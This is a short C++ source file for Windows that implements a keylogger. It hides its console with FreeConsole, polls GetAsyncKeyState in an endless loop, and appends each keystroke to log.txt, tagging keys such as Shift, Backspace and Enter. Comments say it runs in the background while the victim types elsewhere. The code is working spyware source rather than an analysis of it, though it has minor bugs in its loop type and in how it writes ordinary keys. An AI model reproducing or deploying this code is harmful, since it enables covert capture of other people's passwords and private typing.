//CAN TRY WRITING IN NOTEPAD, IT WILL RUN IN THE BG
//keys should show up in terminal n after will display in log file, in terms of LBUTTON, etc
//test
#include <iostream>
#include <Windows.h>
using namespace std;

//to save keys logged to file
int Save(int _key, const char *file);

int main(){

    FreeConsole();

    char i;
    while (true){
        Sleep(10);
        for (i = 8; i <= 255; i++){
            //to catch buttons pressed
            if (GetAsyncKeyState(i) == -32767){
                Save(i, "log.txt"); //log.txt file created to save keys
            }
        }
    }
    return 0;
}

int Save(int _key, const char *file){

    cout << _key << endl;

    Sleep(10);

    FILE *OUTPUT_FILE;
    
    OUTPUT_FILE = fopen(file, "a+"); //add new key continuously to file
    //prevend shift key activation
    if(_key == VK_SHIFT){ //virtual key code
        fprintf( OUTPUT_FILE, "%s", "[SHIFT]");
    }
    else if (_key == VK_BACK){
        fprintf( OUTPUT_FILE, "%s", "[BACK]");
    }
    else if (_key == VK_LBUTTON){
        fprintf( OUTPUT_FILE, "%s", "[LBUTTON]");
    }
    else if (_key == VK_RETURN){
        fprintf( OUTPUT_FILE, "%s", "[RETURN]");
    }
    else if (_key == VK_ESCAPE){
        fprintf( OUTPUT_FILE, "%s", "[ESCAPE]");
    }
    else {
         fprintf(OUTPUT_FILE, "%s", &_key);
    }
    fclose(OUTPUT_FILE);
    
    return 0;
}